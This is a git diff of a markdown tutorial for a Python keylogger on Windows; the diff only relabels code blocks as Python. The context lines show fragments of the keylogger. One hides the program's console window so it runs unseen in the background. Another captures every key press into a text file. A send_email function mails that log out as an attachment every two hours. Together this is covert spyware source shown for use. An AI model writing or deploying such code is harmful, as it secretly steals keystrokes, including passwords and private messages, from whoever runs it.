@@ -41,7 +41,7 @@ The keylogger functions are defined to capture key presses (<b>on_press</b>) and
 
 First let's import the needed libraries:  
 
-```
+```python
 # Libraries
 # These will be installed using the option that includes PYCHARM under Settings > Interpreters
 # I was not able to install these libraries on MacOS using PIP, so I chose to use PARALLELS with Windows 10 and deliver the PEC from there
@@ -75,7 +75,7 @@ import datetime as dt
 Now let's jumpt to the code part.  
 
 Define variables
-```
+```python
 ## Keylogger code
 
 # Variables log file
@@ -92,7 +92,7 @@ tiempo_extra = 5
 
 Let's set the path of the of the generated <b>'.txt'</b> file.  
 
-```
+```python
 # Path where the TXT file of our keylogger will be generated
 file_path = "C:\\USE A PATH YOU LIKE"
 # Allows you to add an extension to the file
@@ -101,7 +101,7 @@ extend = "\\"
 
 To make the program run in background.  
 
-```
+```python
 # Run program in the background
 window = win32console.GetConsoleWindow()
 win32gui.ShowWindow(window, 0)
@@ -109,7 +109,7 @@ win32gui.ShowWindow(window, 0)
 
 Function to send email.  
 
-```
+```python
 # Send the email that adds the TXT file as an attachment to export the pressed keys
 def send_email(filename, attachment, to_address):
     mens = MIMEMultipart()
@@ -138,7 +138,7 @@ def send_email(filename, attachment, to_address):
 
 Part of code that adds the <b>'.txt'</b> file as an attachment and send it out every 2 hours.  
 
-```
+```python
 # Instance that attaches the generated txt as an attachment and sends it every 2 hours
 send_email(pulsation_info, file_path + extend + pulsation_info, to_address)
 
@@ -152,7 +152,7 @@ keys = []
 
 Key press capture funtion.  
 
-```
+```python
 # Function ON_PRESS which will capture the keys that are pressed
 def on_press(key):
     global keys, count, currentTime
@@ -188,7 +188,7 @@ def write_file(keys):
 
 To facilitate the exit of the keylogger.
 
-```
+```python
 # Exit of the keylogger
 def on_release(key):
     if key == Key.esc:
@@ -197,7 +197,7 @@ def on_release(key):
 
 Block listener.
 
-```
+```python
 # Listener
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
